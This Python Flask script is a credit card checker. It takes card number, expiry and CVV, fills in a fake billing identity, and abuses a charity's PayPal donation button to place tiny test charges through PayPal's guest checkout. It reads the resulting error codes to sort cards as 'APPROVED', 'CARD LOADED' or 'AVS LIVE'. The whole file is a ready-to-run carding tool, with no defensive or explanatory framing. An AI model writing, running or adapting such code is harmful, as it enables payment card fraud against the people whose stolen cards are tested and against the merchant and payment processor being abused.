import requests
import random
import string
import time
import re
from flask import Flask, request, jsonify

app = Flask(__name__)

def getstr(string, start, end):
    try:
        str_split = string.split(start)
        str_split = str_split[1].split(end)
        return str_split[0]
    except:
        return ""

def multiexplode(delimiters, string):
    import re
    regex_pattern = '|'.join(map(re.escape, delimiters))
    return re.split(regex_pattern, string)

@app.route('/pp/cc=<ccdata>', methods=['GET'])
def process_card(ccdata):
    start_time = time.time()
    
    # Parse CC Data
    try:
        parts = multiexplode([":", "/", " ", "|"], ccdata)
        cc = parts[0]
        mes = parts[1]
        ano = parts[2]
        cvv = parts[3]
    except Exception:
        return jsonify({"status": "error", "message": "Invalid CC format. Use cc|mm|yy|cvv"}), 400

    if len(ano) == 4:
        an = ano[2:]
    else:
        an = ano
    
    full_year = "20" + an if len(an) == 2 else an
    mes_clean = mes.lstrip('0')
    
    # Bin Lookup
    bin_num = cc[:6]
    try:
        bin_res = requests.get(f'https://binlist.io/lookup/{bin_num}/', timeout=10).json()
        brand = bin_res.get('scheme', 'N/A')
        country = bin_res.get('country', {}).get('name', 'N/A')
        emoji = bin_res.get('country', {}).get('emoji', '')
        card_type = bin_res.get('type', 'N/A')
        category = bin_res.get('category', 'N/A')
        bank = bin_res.get('bank', {}).get('name', 'N/A')
    except:
        brand = country = emoji = card_type = category = bank = "N/A"

    bin_info = f"{card_type} - {brand} - {category}"
    
    # Random Info Generation
    firstname = "".join(random.sample("George", 6))
    lastname = "".join(random.sample("Washington", 10))
    street = f"{random.randint(1000, 9999)} Street 1"
    phone = random.choice(["682", "346", "246"]) + str(random.randint(1000000, 9999999))
    email = f"anthoyn{firstname}us82j37{phone}@gmail.com"
    
    states = {
        "NY": {"postcode": "10080", "city": "New York"},
        "WA": {"postcode": "98001", "city": "Auburn"},
        "AL": {"postcode": "35005", "city": "Adamsville"},
        "FL": {"postcode": "32003", "city": "Orange Park"},
        "CA": {"postcode": "90201", "city": "Bell"}
    }
    st_code = random.choice(list(states.keys()))
    state_data = states[st_code]
    
    session = requests.Session()
    
    # REQ 1: Get Facilitator Access Token
    headers1 = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'referer': 'https://onehealthworkforceacademies.org/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36'
    }
    
    payload1 = 'locale.lang=en&locale.country=US&style.label=&style.layout=vertical&style.color=gold&style.shape=&style.tagline=false&style.height=40&style.menuPlacement=below&sdkVersion=5.0.344&components.0=buttons&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWFNekk4d0VQOURIcFBHOXd0UWRrSWsxdkxwMEJ4S2dtM0RNMi05Vm5KaGhvamFJTVlsNXB1OU5JUjkydWY1blVBYzdoSTI5a1E3akV3SF8mY3VycmVuY3k9TVhOJmxvY2FsZT1lbl9VUyIsImF0dHJzIjp7ImRhdGEtdWlkIjoidWlkX21lcXZmdmR0cGh6YmR6ZmlzZXd5d2ZycWNjeXB6cyJ9fQ&clientID=AaMzI8wEP9DHpPG9wtQdkIk1vLp0BxKgm3DM2-9VnJhhojaIMYl5pu9NIR92uf5nUAc7hI29kQ7jEwH_&sdkCorrelationID=0aab5698a8427&storageID=uid_250b1d7213_mti6ndq6ntc&sessionID=uid_dbc1e53ffd_mti6ndq6ntc&buttonSessionID=uid_1c583f9aa0_mti6ndc6ntk&env=production&buttonSize=large&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjp0cnVlLCJpbnN0YWxsbWVudHMiOmZhbHNlLCJ2ZW5kb3JzIjp7InZpc2EiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sIm1hc3RlcmNhcmQiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImFtZXgiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImRpc2NvdmVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6ZmFsc2V9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpdGF1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImNyZWRpdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJhcHBsZXBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzZXBhIjp7ImVsaWdpYmxlIjpmYWxzZX0sImlkZWFsIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJhbmNvbnRhY3QiOnsiZWxpZ2libGUiOmZhbHNlfSwiZ2lyb3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJlcHMiOnsiZWxpZ2libGUiOmZhbHNlfSwic29mb3J0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm15YmFuayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwMjQiOnsiZWxpZ2libGUiOmZhbHNlfSwiemltcGxlciI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ3ZWNoYXRwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGF5dSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJibGlrIjp7ImVsaWdpYmxlIjpmYWxzZX0sInRydXN0bHkiOnsiZWxpZ2libGUiOmZhbHNlfSwib3h4byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtYXhpbWEiOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0b2JhbmNhcmlvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1lcmNhZG9wYWdvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm11bHRpYmFuY28iOnsiZWxpZ2libGUiOmZhbHNlfSwic2F0aXNwYXkiOnsiZWxpZ2libGUiOmZhbHNlfX0&platform=desktop&experiment.enableVenmo=false&experiment.enableVenmoAppLabel=false&flow=purchase&currency=MXN&intent=capture&commit=true&vault=false&renderedButtons.0=paypal&renderedButtons.1=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=false&experience=&allowBillingPayments=true'
    
    r1 = session.post('https://www.paypal.com/smart/buttons', headers=headers1, data=payload1)
    bearer = getstr(r1.text, 'facilitatorAccessToken":"', '"')
    
    if not bearer:
        return jsonify({"status": "error", "message": "Failed to get access token"}), 500

    # REQ 2: Create Order
    headers2 = {
        'accept': 'application/json',
        'authorization': f'Bearer {bearer}',
        'content-type': 'application/json',
        'prefer': 'return=representation',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36'
    }
    payload2 = {
        "purchase_units": [{
            "amount": {"currency_code": "MXN", "value": "1"},
            "description": "Donativo único",
            "custom_id": "Referencia: Donativo único. Acerca del donativo: ",
            "item_list": {"items": [{"name": "FDUM", "description": "FDUM description"}]}
        }],
        "intent": "CAPTURE",
        "application_context": {}
    }
    
    r2 = session.post('https://www.paypal.com/v2/checkout/orders', headers=headers2, json=payload2)
    orden = r2.json().get('id')
    
    if not orden:
        return jsonify({"status": "error", "message": "Failed to create order"}), 500

    # REQ 3: GraphQL Pay with Card
    headers3 = {
        'accept': '*/*',
        'content-type': 'application/json',
        'paypal-client-context': orden,
        'paypal-client-metadata-id': orden,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
        'x-app-name': 'standardcardfields',
        'x-country': 'US'
    }
    
    query = """
        mutation payWithCard(
            $token: String!
            $card: CardInput!
            $phoneNumber: String
            $firstName: String
            $lastName: String
            $shippingAddress: AddressInput
            $billingAddress: AddressInput
            $email: String
            $currencyConversionType: CheckoutCurrencyConversionType
            $installmentTerm: Int
        ) {
            approveGuestPaymentWithCreditCard(
                token: $token
                card: $card
                phoneNumber: $phoneNumber
                firstName: $firstName
                lastName: $lastName
                email: $email
                shippingAddress: $shippingAddress
                billingAddress: $billingAddress
                currencyConversionType: $currencyConversionType
                installmentTerm: $installmentTerm
            ) {
                flags {
                    is3DSecureRequired
                }
                cart {
                    intent
                    cartId
                    buyer {
                        userId
                        auth {
                            accessToken
                        }
                    }
                    returnUrl {
                        href
                    }
                }
                paymentContingencies {
                    threeDomainSecure {
                        status
                        method
                        redirectUrl {
                            href
                        }
                        parameter
                    }
                }
            }
        }
    """
    
    variables = {
        "token": orden,
        "card": {
            "cardNumber": cc,
            "expirationDate": f"{mes_clean}/{full_year}",
            "postalCode": state_data["postcode"],
            "securityCode": cvv
        },
        "phoneNumber": phone,
        "firstName": firstname,
        "lastName": lastname,
        "billingAddress": {
            "givenName": firstname,
            "familyName": lastname,
            "line1": street,
            "line2": None,
            "city": state_data["city"],
            "state": st_code,
            "postalCode": state_data["postcode"],
            "country": "US"
        },
        "shippingAddress": {
            "givenName": firstname,
            "familyName": lastname,
            "line1": street,
            "line2": None,
            "city": state_data["city"],
            "state": st_code,
            "postalCode": state_data["postcode"],
            "country": "US"
        },
        "email": email,
        "currencyConversionType": "VENDOR"
    }
    
    r3 = session.post('https://www.paypal.com/graphql?fetch_credit_form_submit', 
                     headers=headers3, 
                     json={"query": query, "variables": variables})
    
    res_text = r3.text
    msg = getstr(res_text, 'message":"', '"')
    code = getstr(res_text, 'code":"', '"')
    
    # Response Logic
    status = "DECLINED ❌"
    response_msg = msg
    response_code = code
    
    success_markers = [
        'ADD_SHIPPING_ERROR', 'NEED_CREDIT_CARD', '"status": "succeeded"',
        'Thank You For Donation.', 'Your payment has already been processed',
        'Success ', '"type":"one-time"', '/donations/thank_you?donation_number='
    ]
    
    if any(marker in res_text for marker in success_markers):
        status = "APPROVED ✅"
        response_msg = "CARD LOADED"
        response_code = "CHARGED 0.01$ SUCCESSFULLY 🟢"
    elif 'INVALID_BILLING_ADDRESS' in res_text:
        status = "APPROVED ✅"
        response_msg = "INVALID BILLING ADDRESS"
        response_code = "AVS LIVE 🟢"
    elif 'INVALID_SECURITY_CODE' in res_text:
        status = "APPROVED ✅"
        response_msg = "INVALID SECURITY CODE"
        response_code = "Approved CCN ✅"
    elif 'EXISTING_ACCOUNT_RESTRICTED' in res_text:
        status = "APPROVED ✅"
        response_msg = "Existing Account Restricted"
        response_code = "-"
    elif 'is3DSecureRequired' in res_text:
        status = "APPROVED ✅"
        response_msg = "3D SECURE REQUIRED 🟡"
        response_code = "."
    elif 'CARD_GENERIC_ERROR' in res_text:
        status = "DECLINED ❌"
        response_msg = "ISSUER_DECLINE"
        response_code = "CARD_GENERIC_ERROR"

    end_time = time.time()
    time_taken = round(end_time - start_time, 2)
    
    return jsonify({
        "status": status,
        "card": f"{cc}|{mes}|{an}|{cvv}",
        "gateway": "PAYPAL 0.01$",
        "response": f"{response_msg}/{response_code}",
        "bin_info": bin_info,
        "bank": bank,
        "country": f"{country} {emoji}",
        "time": f"{time_taken} Seconds"
    })

if __name__ == '__main__':
    import os
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
